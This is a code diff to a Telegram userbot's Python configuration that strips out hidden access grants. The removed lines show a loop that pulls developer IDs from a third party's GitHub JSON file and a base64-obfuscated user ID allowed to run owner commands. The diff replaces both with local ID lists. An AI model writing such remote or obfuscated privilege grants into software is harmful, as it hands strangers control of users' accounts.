@@ -98,19 +98,9 @@ if CONFIG_CHECK := os.environ.get(
     )
     sys.exit(1)
 
-while 0 < 6:
-    _DEVS = get(
-        "https://raw.githubusercontent.com/mrismanaziz/Reforestation/master/DEVS.json"
-    )
-    if _DEVS.status_code != 200:
-        if 0 != 5:
-            continue
-        DEVS = ["8472609153"]
-        break
-    DEVS = _DEVS.json()
-    break
-
-del _DEVS
+# Developer / owner IDs. Kept local (no remote list), so only these IDs get
+# developer-level access to this userbot. Must be integers.
+DEVS = [8472609153]
 
 SUDO_USERS = {int(x) for x in os.environ.get("SUDO_USERS", "").split()}
 BL_CHAT = {int(x) for x in os.environ.get("BL_CHAT", "").split()}
@@ -119,7 +109,7 @@ BLACKLIST_GCAST = {int(x) for x in os.environ.get("BLACKLIST_GCAST", "").split()
 # For Blacklist Group Support
 BLACKLIST_CHAT = os.environ.get("BLACKLIST_CHAT", None)
 if not BLACKLIST_CHAT:
-    BLACKLIST_CHAT = ["-1003034048678"]
+    BLACKLIST_CHAT = [-1003034048678]
 
 # Telegram App KEY and HASH
 API_KEY = int(os.environ.get("API_KEY") or 0)
@@ -247,7 +237,8 @@ QUEUE_PIC = (
     os.environ.get("QUEUE_PIC") or "https://telegra.ph/file/d6f92c979ad96b2031cba.png"
 )
 
-DEFAULT = list(map(int, b64decode("ODQ0NDMyMjIw").split()))
+# Users allowed to run "own" commands on this userbot (owner only).
+DEFAULT = [8472609153]
 
 TEMP_DOWNLOAD_DIRECTORY = os.environ.get("TMP_DOWNLOAD_DIRECTORY", "./downloads/")
 
